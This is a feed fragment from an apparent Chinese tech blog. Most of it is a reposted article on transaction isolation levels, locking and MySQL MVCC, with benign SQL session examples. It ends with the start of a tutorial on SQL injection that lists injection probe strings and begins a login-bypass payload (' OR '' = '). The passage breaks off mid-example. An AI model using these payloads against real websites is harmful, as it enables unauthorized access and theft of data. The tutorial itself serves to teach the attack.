&lt;p&gt;有时候我们把回滚覆盖称之为 &lt;strong&gt;第一类丢失更新&lt;/strong&gt; 问题，提交覆盖称为 &lt;strong&gt;第二类丢失更新&lt;/strong&gt; 问题。&lt;/p&gt;

&lt;h2 id=&#34;隔离级别&#34;&gt;隔离级别&lt;/h2&gt;

&lt;p&gt;上面说了这么多并发场景下数据操作可能遇到的问题，那么要如何解决呢？我们能想到的最简单的方法就是对操作的数据进行加锁，写的时候不允许其他事务读，读的时候不允许其他事务写，这样是不是就完美解决了？确实如此。这其实就是四大隔离级别里的 序列化，在序列化隔离级别下，可以保证事务的安全执行，数据库的一致性得以保障，但是它大大降低了事务的并发能力，性能最低。&lt;/p&gt;

&lt;p&gt;为了调和事务的安全性和性能之间的冲突，适当的降低隔离级别，可以有效的提高数据库的并发性能。于是便有了四种不同的隔离级别：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;读未提交（Read Uncommitted）：&lt;strong&gt;另一个事务修改了数据，但尚未提交，而本事务中的SELECT会读到这些未被提交的数据（脏读）&lt;/strong&gt;。会出现脏读，幻读，不可重复读，所有并发问题都可能遇到；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;读已提交（Read Committed）：&lt;strong&gt;本事务读取到的是最新的数据（其他事务提交后的）&lt;/strong&gt;。不会出现脏读现象,但是会出现幻读;不可重复读;（大多数数据库的默认隔离级别都是 RC，但是 MySQL InnoDb 默认是 RR）&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;可重复读（Repeatable Read）：&lt;strong&gt;在同一个事务里，SELECT的结果是事务开始时时间点的状态，因此，同样的SELECT操作读到的结果会是一致的&lt;/strong&gt;。MySQL InnoDb 默认的隔离级别,解决了不可重复读问题,但是任然存在幻读问题;（MySQL 的实现有差异，后面介绍）&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;序列化（Serializable）：&lt;strong&gt;读操作会隐式获取共享锁，可以保证不同事务间的互斥&lt;/strong&gt;。最高隔离级别，啥并发问题都没有。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;针对这四种隔离级别，应该根据具体的业务来取舍，如果某个系统的业务里根本就不会出现重复读的场景，完全可以将数据库的隔离级别设置为 RC，这样可以最大程度的提高数据库的并发性。不同的隔离级别和可能发生的并发现象如下表：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/06/7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;其中，在 &lt;strong&gt;可重复读（RR）&lt;/strong&gt; 隔离级别下，是否可能出现第二类丢失更新问题（提交覆盖）比较有争议，网上对此有很多不一致的说法，其实也是因为 MySQL 的实现和 ANSI-SQL 标准之间的差异，在标准的传统实现中，RR 隔离级别是使用持续的 X 锁和持续的 S 锁来实现的（参看下面的 “隔离级别的实现” 一节），由于是持续的 S 锁，所以避免了其他事务有写操作，也就不存在提交覆盖问题。但是 MySQL 在 RR 隔离级别下，普通的 SELECT 语句只是快照读，没有任何的加锁，和标准的 RR 是不一样的。如果要让 MySQL 在 RR 隔离级别下不发生提交覆盖，可以使用 SELECT &amp;hellip; LOCK IN SHARE MODE 或者 SELECT &amp;hellip; FOR UPDATE 。&lt;/p&gt;

&lt;h3 id=&#34;隔离级别的实现&#34;&gt;隔离级别的实现&lt;/h3&gt;

&lt;p&gt;上面所说的事务和隔离级别的概念，其实都是 SQL 标准中通用的概念，但是不同的数据库产品对标准的实现也会有很大的不同。譬如在 SQL 标准中，RR 隔离级别解决了不可重复读问题，但是依然存在幻读现象；而在 MySQL 的 RR 隔离级别下，通过多版本快照读和间隙锁技术解决了幻读问题。关于这一点也有人心存质疑，譬如 &lt;a href=&#34;https://github.com/Yhzhtk/note/issues/42&#34;&gt;Innodb 中 RR 隔离级别能否防止幻读？&lt;/a&gt; 和 &lt;a href=&#34;http://blog.sina.com.cn/s/blog_499740cb0100ugs7.html&#34;&gt;MySQL的InnoDB的幻读问题&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;可重复读和提交读是矛盾的。在同一个事务里，如果保证了可重复读，就会看不到其他事务的提交，违背了提交读；如果保证了提交读，就会导致前后两次读到的结果不一致，违背了可重复读。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;个人认为RR 隔离级别下存不存在幻读现象，取决于“幻读”的这个“读”字在 MySQL 里的歧义，这个“读”到底指的是快照读，还是当前读？（&lt;a href=&#34;https://www.jianshu.com/p/27352449bcc0&#34;&gt;快照读与当前读区别&lt;/a&gt;和&lt;a href=&#34;https://blog.csdn.net/silyvin/article/details/79280934&#34;&gt;innodb当前读与快照读&lt;/a&gt;）如果是快照读，MySQL 通过版本号来保证同一个事务里每次查询得到的结果集都是一致的；如果是当前读，MySQL 通过 Next-key locks 保证其他事务无法插入新的数据，从而避免幻读问题。&lt;/p&gt;

&lt;h3 id=&#34;传统的隔离级别&#34;&gt;传统的隔离级别&lt;/h3&gt;

&lt;p&gt;隔离级别和锁本身就是两个东西，SQL 规范中定义的四种隔离级别，分别是为了解决事务并发时可能遇到的四种问题，至于如何解决，实现方式是什么，规范中并没有严格定义。&lt;/p&gt;

&lt;p&gt;锁作为最简单最显而易见的实现方式，可能被广为人知，所以大家在讨论某个隔离级别的时候，往往会说这个隔离级别的加锁方式是什么样的。其实，锁只是实现隔离级别的几种方式之一，除了锁，实现并发问题的方式还有&lt;a href=&#34;https://en.wikipedia.org/wiki/Timestamp-based_concurrency_control&#34;&gt;时间戳&lt;/a&gt;，&lt;a href=&#34;https://en.wikipedia.org/wiki/Multiversion_concurrency_control&#34;&gt;多版本控制&lt;/a&gt;等等，这些也可以称为&lt;a href=&#34;https://en.wikipedia.org/wiki/Non-lock_concurrency_control&#34;&gt;无锁的并发控制&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;传统的隔离级别是基于锁实现的，这种方式叫做 &lt;strong&gt;基于锁的并发控制（Lock-Based Concurrent Control，简写 LBCC）&lt;/strong&gt;。通过对读写操作加不同的锁，以及对释放锁的时机进行不同的控制，就可以实现四种隔离级别。&lt;/p&gt;

&lt;p&gt;传统的锁有两种：读操作通常加 &lt;strong&gt;共享锁（Share locks，S锁，又叫读锁），写操作加排它锁（Exclusive locks，X锁，又叫写锁）&lt;/strong&gt;；加了共享锁的记录，其他事务也可以读，但不能写；加了排它锁的记录，其他事务既不能读，也不能写。另外，对于锁的粒度，又分为行锁和表锁，行锁只锁某行记录，对其他行的操作不受影响，表锁会锁住整张表，所有对这个表的操作都受影响。&lt;/p&gt;

&lt;p&gt;归纳起来，四种隔离级别的加锁策略如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;读未提交（Read Uncommitted）：事务读不阻塞其他事务读和写，事务写阻塞其他事务写但不阻塞读；通过对写操作加 “持续X锁”，对读操作不加锁 实现；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;读已提交（Read Committed）：事务读不会阻塞其他事务读和写，事务写会阻塞其他事务读和写；通过对写操作加 “持续X锁”，对读操作加 “临时S锁” 实现；不会出现脏读；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;可重复读（Repeatable Read）：事务读会阻塞其他事务事务写但不阻塞读，事务写会阻塞其他事务读和写；通过对写操作加 “持续X锁”，对读操作加 “持续S锁” 实现；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;序列化（Serializable）：为了解决幻读问题，行级锁做不到，需使用表级锁。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;结合上面介绍的每种隔离级别分别是用来解决事务并发中的什么问题，再来看看它的加锁策略其实都挺有意思的。其中 读未提交 网上有很多人认为不需要加任何锁，这其实是错误的，我们上面讲过，有一种并发问题在任何隔离级别下都不允许存在，那就是第一类丢失更新（回滚覆盖），如果不对写操作加 X 锁，当两个事务同时去写某条记录时，可能会出现丢失更新问题，&lt;a href=&#34;https://www.jianshu.com/p/71a79d838443&#34;&gt;这里&lt;/a&gt; 有一个例子可以看到写操作不加 X 锁发生了回滚覆盖。再看 读已提交，它是为了解决脏读问题，只能读取已提交的记录，要怎么做才可以保证事务中的读操作读到的记录都是已提交的呢？&lt;strong&gt;很简单，对读操作加上 S 锁，这样如果其他事务有正在写的操作，必须等待写操作提交之后才能读，因为 S 和 X 互斥，如果在读的过程中其他事务想写，也必须等事务读完之后才可以。这里的 S 锁是一个临时 S 锁，表示事务读完之后立即释放该锁，可以让其他事务继续写，如果事务再读的话，就可能读到不一样的记录，这就是 不可重复读 了。为了让事务可以重复读，加在读操作的 S 锁变成了持续 S 锁，也就是直到事务结束时才释放该锁，这可以保证整个事务过程中，其他事务无法进行写操作，所以每次读出来的记录是一样的&lt;/strong&gt;。最后，序列化 隔离级别下单纯的使用行锁已经实现不了，因为行锁不能阻止其他事务的插入操作，这就会导致幻读问题，这种情况下，我们可以把锁加到表上（也可以通过范围锁来实现，但是表锁就相当于把表的整个范围锁住，也算是特殊的范围锁吧）。&lt;/p&gt;

&lt;p&gt;从上面的描述可以看出，通过对锁的类型（读锁还是写锁），锁的粒度（行锁还是表锁），持有锁的时间（临时锁还是持续锁）合理的进行组合，就可以实现四种不同的隔离级别。这四种不同的加锁策略实际上又称为 封锁协议（Locking Protocol），所谓协议，就是说不论加锁还是释放锁都得按照特定的规则来。读未提交 的加锁策略又称为 一级封锁协议，后面的分别是二级，三级，序列化 的加锁策略又称为 四级封锁协议。&lt;/p&gt;

&lt;p&gt;其中三级封锁协议在事务的过程中为写操作加持续 X 锁，为读操作加持续 S 锁，并且在事务结束时才对锁进行释放，像这种加锁和解锁明确的分成两个阶段我们把它称作 两段锁协议（2-phase locking，简称 2PL）。在两段锁协议中规定，加锁阶段只允许加锁，不允许解锁；而解锁阶段只允许解锁，不允许加锁。这种方式虽然无法避免死锁，但是两段锁协议可以保证事务的并发调度是串行化的（关于串行化是一个非常重要的概念，尤其是在数据恢复和备份的时候）。在两段锁协议中，还有一种特殊的形式，叫 一次封锁，意思是指在事务开始的时候，将事务可能遇到的数据全部一次锁住，再在事务结束时全部一次释放，这种方式可以有效的避免死锁发生。但是这在数据库系统中并不适用，因为事务开始时并不知道这个事务要用到哪些数据，一般在应用程序中使用的比较多。&lt;/p&gt;

&lt;h3 id=&#34;mysql-的隔离级别&#34;&gt;MySQL 的隔离级别&lt;/h3&gt;

&lt;p&gt;虽然数据库的四种隔离级别通过 LBCC 技术都可以实现，但是它最大的问题是它只实现了并发的读读，对于并发的读写还是冲突的，写时不能读，读时不能写，当读写操作都很频繁时，数据库的并发性将大大降低，针对这种场景，MVCC 技术应运而生。MVCC 的全称叫做 Multi-Version Concurrent Control（多版本并发控制），InnoDb 会为每一行记录增加几个隐含的“辅助字段”，（实际上是 3 个字段：一个隐式的 ID 字段，一个事务 ID，还有一个回滚指针），事务在写一条记录时会将其拷贝一份生成这条记录的一个原始拷贝，写操作同样还是会对原记录加锁，但是读操作会读取未加锁的新记录，这就保证了读写并行。要注意的是，生成的新版本其实就是 undo log，它也是实现事务回滚的关键技术。关于 InnoDb 的 MVCC 机制的实现原理推荐看下这篇文章：&lt;a href=&#34;http://www.imooc.com/article/17290&#34;&gt;MySQL数据库事务各隔离级别加锁情况&amp;ndash;read committed &amp;amp;&amp;amp; MVCC&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;InnoDb 通过 MVCC 实现了读写并行，但是在不同的隔离级别下，读的方式也是有所区别的。首先要特别指出的是，在 read uncommit 隔离级别下，每次都是读取最新版本的数据行，所以不能用 MVCC 的多版本，而 serializable 隔离级别每次读取操作都会为记录加上读锁，也和 MVCC 不兼容，所以只有 RC 和 RR 这两个隔离级别才有 MVCC。下面我们通过两个例子，来看看这两个隔离级别下 MVCC 有什么区别。&lt;/p&gt;

&lt;p&gt;还是使用上面的 account 表，首先将 MySQL 的事务隔离级别设置为 RR，然后开启一个事务，执行下面的 SQL：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  mysql&amp;gt; begin;
  Query OK, 0 rows affected (0.00 sec)

  mysql&amp;gt; select * from account where id = 1;
  +----+----------+---------+
  | id |     name | balance |
  +----+----------+---------+
  |  1 |        A |  1000   |
  +----+----------+---------+
  1 row in set (0.00 sec)

  mysql&amp;gt; update account set balance = 2000 where id = 1;
  Query OK, 1 row affected (0.00 sec)
  Rows matched: 1  Changed: 1  Warnings: 0

  mysql&amp;gt; select * from account where id = 1;
  +----+----------+---------+
  | id |     name | balance |
  +----+----------+---------+
  |  1 |        A |  2000   |
  +----+----------+---------+
  1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;开启第二个事务，如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; begin;
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; select * from account where id = 1;
+----+----------+---------+
| id |     name | balance |
+----+----------+---------+
|  1 |        A |  1000   |
+----+----------+---------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到事务 2 查询出来的还是 A 原始的信息，这个时候事务 1 使用 commit 提交：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; commit;
Query OK, 0 rows affected (0.05 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;并在事务 2 中再查询一次，发现查询出来的结果不变，还是原始值：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; select * from account where id = 1;
+----+----------+---------+
| id |     name | balance |
+----+----------+---------+
|  1 |        A |  1000   |
+----+----------+---------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样的，我们将数据库的隔离级别设置为 RC，重新做一次这个实验，第一步都是一样的，只是第二步当事务 1 commit 之后，事务 2 再查一次发现查询出来的是最新提交的记录了：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; select * from account where id = 1;
+----+----------+---------+
| id |     name | balance |
+----+----------+---------+
|  1 |        A |  2000   |
+----+----------+---------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通过这个实验可以知道，尽管 RR 和 RC 隔离级别都实现了 MVCC 来满足读写并行，但是读的实现方式是不一样的：&lt;strong&gt;RC 总是读取记录的最新版本，如果该记录被锁住，则读取该记录最新的一次快照，而 RR 是读取该记录事务开始时的那个版本。&lt;/strong&gt; 虽然这两种读取方式不一样，但是它们读取的都是快照数据，并不会被写操作阻塞，所以这种读操作称为 快照读（Snapshot Read），有时候也叫做 &lt;strong&gt;非阻塞读（Nonlocking Read）&lt;/strong&gt;，RR 隔离级别下的叫做 &lt;strong&gt;一致性非阻塞读（Consistent Nonlocking Read）&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;除了 &lt;strong&gt;快照读&lt;/strong&gt; ，MySQL 还提供了另一种读取方式：&lt;strong&gt;当前读（Current Read）&lt;/strong&gt;，有时候又叫做 &lt;strong&gt;加锁读（Locking Read）&lt;/strong&gt; 或者 &lt;strong&gt;阻塞读（Blocking Read&lt;/strong&gt;），这种读操作读的不再是数据的快照版本，而是数据的最新版本，并会对数据加锁，根据加锁的不同，又分成两类：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SELECT &amp;hellip; LOCK IN SHARE MODE：加 S 锁&lt;/li&gt;
&lt;li&gt;SELECT &amp;hellip; FOR UPDATE：加 X 锁&lt;/li&gt;
&lt;li&gt;INSERT / UPDATE / DELETE：加 X 锁&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当前读在 RR 和 RC 两种隔离级别下的实现也是不一样的：&lt;strong&gt;RC 只加记录锁，RR 除了加记录锁，还会加间隙锁，用于解决幻读问题，&lt;/strong&gt; 关于记录锁和间隙锁的概念后面再讲，有兴趣的同学可以和上面一样，通过两个例子来感受一下。&lt;/p&gt;

&lt;p&gt;首先在 RC 隔离级别下，开启一个事务，执行下面的 SQL 查询所有 id &amp;gt; 3 的记录，使用当前读而不是快照读：
首先在 RC 隔离级别下，开启一个事务，执行下面的 SQL 查询所有 id &amp;gt; 3 的记录，使用当前读而不是快照读：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; begin;
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; select * from account where id &amp;gt; 3 lock in share mode;
+----+----------+---------+
| id |     name | balance |
+----+----------+---------+
|  4 |        D |  1000   |
+----+----------+---------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同时，开启另一个事务，向 account 表中新增一条记录，然后修改 id = 4 的记录：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;  mysql&amp;gt; begin;
  Query OK, 0 rows affected (0.00 sec)

  mysql&amp;gt; insert into account(name, balance) value(&#39;E&#39;, 1000);
  Query OK, 1 row affected (6.24 sec)

  mysql&amp;gt; update account set balance = 2000 where id = 4;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到事务 2 在事务 1 当前读之后，仍然可以新增记录，但是在执行 update 操作的时候被阻塞，这说明了事务 1 在执行当前读的时候在 id = 4 这条记录上加了锁，但是并没有对 id &amp;gt; 3 这个范围加锁。然后我们切换到事务 1 中，再次查询：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; select * from account where id &amp;gt; 3 lock in share mode;
ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个时候事务 1 直接死锁了，原因其实很简单，事务 2 在 insert 新纪录的时候（id = 5）会在新纪录上加锁，所以事务 1 再次执行当前读，想获取 id &amp;gt; 3 的记录，就需要在 id = 4 和 id = 5 这两条记录上加锁，但是 id = 5 这条记录已经被事务 2 锁住了，于是事务 1 被事务 2 阻塞，同时事务 2 还在等待 事务 1 释放 id = 4 上的锁，于是便产生了死锁。&lt;/p&gt;

&lt;p&gt;接下来把隔离级别设置成 RR，再重复事务 1 刚刚的操作：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; begin;
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; select * from account where id &amp;gt; 3 lock in share mode;
+----+----------+---------+
| id |     name | balance |
+----+----------+---------+
|  4 |        D |  1000   |
+----+----------+---------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同时，事务 2 向 account 表中新增一条记录：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; begin;
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; insert into account(name, balance) value(&#39;E&#39;, 1000);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们发现，这个时候事务 2 就被阻塞了，很显然事务 1 在执行 select &amp;hellip; lock in share mode 的时候，不仅在 id = 4 这条记录上加了锁，而且在 id &amp;gt; 3 这个范围上也加了锁。&lt;/p&gt;

&lt;p&gt;关于 MySQL 不同的隔离级别，读操作的差异总结起来如下图所示（其中，读未提交和可序列化都和 MVCC 不兼容，可以暂且认为它们都属于当前读）：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/06/8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;查看和设置-mysql-的隔离级别&#34;&gt;查看和设置 MySQL 的隔离级别&lt;/h3&gt;

&lt;p&gt;可以通过查看 MySQL 中的系统变量 tx_isolation 的值来确定当前 MySQL 正在使用什么隔离级别。使用下面的 SQL 查询当前数据库的隔离级别：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; select @@tx_isolation;
+-----------------+
| @@tx_isolation  |
+-----------------+
| REPEATABLE-READ |
+-----------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里要注意的是在 MySQL 中变量一般分为两类：用户变量 和 系统变量，用户变量的变量名格式为 @variable，而系统变量的格式为 @@variable，tx_isolation 是系统变量，所以变量名为 @@tx_isolation。其中，系统变量又可以分为 全局变量 和 会话变量，默认情况下使用 select @@variable 查询出来的是会话变量的值，也可以写作 select @@session.variable 或者 select @@local.variable，如果要查询全局变量的值，则使用 select @@global.variable。&lt;/p&gt;

&lt;p&gt;所以通常使用下面的 SQL 查询数据库的隔离级别：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; select @@session.tx_isolation, @@global.tx_isolation;
+------------------------+-----------------------+
| @@session.tx_isolation | @@global.tx_isolation |
+------------------------+-----------------------+
| REPEATABLE-READ        | REPEATABLE-READ       |
+------------------------+-----------------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;另外可以使用 SET TRANSACTION 命令修改 MySQL 的隔离级别，譬如下面的 SQL 修改隔离级别为 RC：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; set transaction isolation level read committed;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样其他的隔离级别可以使用下面的 SQL 进行修改：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;set transaction isolation level read uncommitted;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;set transaction isolation level read committed;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;set transaction isolation level repeatable read;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;set transaction isolation level serializable;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里也有一个要注意的地方，默认的 SET TRANSACTION 命令 只对当前会话的下一个事务有效，当下个事务结束之后，下下个事务又会恢复到当前会话的隔离级别。我在这个地方困惑了好久，因为使用 SET TRANSACTION 命令设置完隔离级别之后，通过 select @@tx_isolation 查询当前会话的隔离级别是不会变化的，但是实际上下一个事务的隔离级别确实已经修改了.&lt;/p&gt;

&lt;p&gt;找到了一种可以查看事务隔离级别的方法，那就是查 information_schema.INNODB_TRX 表。这种方式有一个不方便的地方在于，事务里必须要先执行一条 SQL 语句，才会在 INNODB_TRX 表中有记录，如下所示：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; select * from information_schema.INNODB_TRX\G
*************************** 1. row ***************************
                   trx_id: 282133714024240
                trx_state: RUNNING
              trx_started: 2018-07-25 23:12:58
    trx_requested_lock_id: NULL
         trx_wait_started: NULL
               trx_weight: 0
      trx_mysql_thread_id: 40
                trx_query: NULL
      trx_operation_state: NULL
        trx_tables_in_use: 0
        trx_tables_locked: 0
         trx_lock_structs: 0
    trx_lock_memory_bytes: 1136
          trx_rows_locked: 0
        trx_rows_modified: 0
  trx_concurrency_tickets: 0
      trx_isolation_level: READ COMMITTED
        trx_unique_checks: 1
   trx_foreign_key_checks: 1
trx_last_foreign_key_error: NULL
trx_adaptive_hash_latched: 0
trx_adaptive_hash_timeout: 0
         trx_is_read_only: 0
trx_autocommit_non_locking: 0
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果要修改当前会话的隔离级别，而不是仅仅下一个事务的隔离级别（这在做实验时挺有用的），需要使用下面命令：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; set session transaction isolation level read committed;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;另外，也可以使用修改系统变量的方法来修改隔离级别：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; set @@session.tx_isolation = &#39;READ-COMMITTED&#39;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果要修改全局变量的话，则使用命令 set global transaction isolation level &amp;hellip; 或者 set @@global.tx_isolation = &amp;hellip;，方法与上面类似，不再赘述。不过要注意的是，这个命令不会改变当前会话的隔离级别，而是对新的会话有影响，所以要关闭当前会话，重新开启一个会话才能看到效果。
转载自：&lt;a href=&#34;https://www.aneasystone.com/archives/2017/10/solving-dead-locks-one.html&#34;&gt;aneasystone&amp;rsquo;s blog&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>了解SQL注入</title>
      <link>https://wangzitao6.github.io/2018-05-06-%E4%BA%86%E8%A7%A3sql%E6%B3%A8%E5%85%A5</link>
      <pubDate>Sun, 06 May 2018 10:41:29 +0800</pubDate>
      
      <guid>https://wangzitao6.github.io/2018-05-06-%E4%BA%86%E8%A7%A3sql%E6%B3%A8%E5%85%A5</guid>
      <description>

&lt;h2 id=&#34;1-简介&#34;&gt;1.简介&lt;/h2&gt;

&lt;p&gt;SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。一般来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。&lt;/p&gt;

&lt;h2 id=&#34;2-sql注入的位置&#34;&gt;2.SQL注入的位置&lt;/h2&gt;

&lt;p&gt;SQL注入只有在SQL语句中插入了用户输入的字符串并没有做好相应的处理时才会发生，用户输入的来源可以是URL参数，POST数据，外部用户输入信息等。程序员在编写代码时往往需要在SQL中填入用户输入的参数，譬如根据用户ID查询用户信息，查询链接类似于/get_user_info.php?uid=123，具体到SQL代码可能是下面这样：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM User WHERE uid = 123
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;或者是根据用户名来查找用户，链接类似于/search_user.php?name=Zhangsan，具体到SQL代码类似于下面：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM User WHERE name = &#39;Zhangsan&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上面例子中123和Zhangsan就是用户输入的参数，同时也是可能的注入点。常见的SQL注入位置有下面几种（当然程序员可以把用户参数写到任何地方，不仅仅是WHERE条件里，也可以是ORDER BY或GROUP BY子句，甚至是SQL语句本身）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM table WHERE id = XXX
  SELECT * FROM table WHERE name = &#39;XXX&#39;
  SELECT * FROM table WHERE name = &#39;XXX&#39; AND pass = &#39;YYY&#39;
  SELECT * FROM table WHERE name = &amp;quot;XXX&amp;quot;
  SELECT * FROM table WHERE id IN (XXX)
  SELECT * FROM table WHERE name like &#39;%XXX%&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;3-sql注入方法&#34;&gt;3.SQL注入方法&lt;/h2&gt;

&lt;p&gt;从上面列出的SQL语句可以看出，常见的查询参数有可能是数字类型，也可能是字符串类型。两种类型的参数有不同的注入检测方法，字符串类型的参数可以使用 &amp;lsquo; &amp;ldquo; &amp;rdquo; &amp;ldquo;&amp;rdquo; \ \\ 进行试探，而数字类型时可以用AND 1、AND 0、AND true、AND false、1-false、1-true、2-1、1*100等方法进行试探。下面举例说明： 一般情况下，如果程序对用户输入的参数做了正确的处理，那么输入任何参数页面都不会报错。如下面两句SQL：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM User WHERE name = &#39;Zhangsan&#39;&#39;
  SELECT * FROM User WHERE name = &#39;Zhangsan&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这两个SQL第二个是合法的，只要引号成对出现都没问题。如果用户分别输入Zhangsan&amp;rsquo;和Zhangsan&amp;rdquo;页面都能正常返回，则表明不存在注入问题，如果第一个输入页面异常，而第二个输入正常则表明该参数很可能是一个可以利用的注入点。 数字类型的参数看下面这个例子，如果用户输入123 AND 1和123 AND 0页面返回正常，并且结果一样，则说明程序对参数作了处理，而如果输入123 AND 1返回正常，输入123 AND 0返回空页面，则说明存在注入的可能。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM User WHERE uid = 123 AND 1
  SELECT * FROM User WHERE uid = 123 AND 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;##　4.注入能做什么
如果SQL注入只是简单的让页面出错或者返回空页面的话，那么SQL注入也就不会这么吸引人了。SQL注入的强大之处在于可以在服务器上做几乎任何事，听起来似乎是危言耸听，但事实确实如此，要不然SQL注入怎么会和DOS攻击一起成为最流行的网络攻击方法呢。下面我们就来看下通过一个简单的URL参数，可以做多么不可思议的事。&lt;/p&gt;

&lt;h3 id=&#34;4-1-绕开验证&#34;&gt;4.1 绕开验证&lt;/h3&gt;

&lt;p&gt;在用户登陆时，往往要根据用户输入的用户名和密码到数据库中进行查询比较，如果用户名和密码匹配则认为登陆成功。相应的SQL语句如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM Customer WHERE name = &#39;XX&#39; AND pass = &#39;YY&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果没有对用户输入的参数进行检查，则当输入用户名为admin，密码为&amp;rsquo; OR &amp;ldquo; = &amp;lsquo; 时，执行下面的SQL语句：&lt;/p&gt;

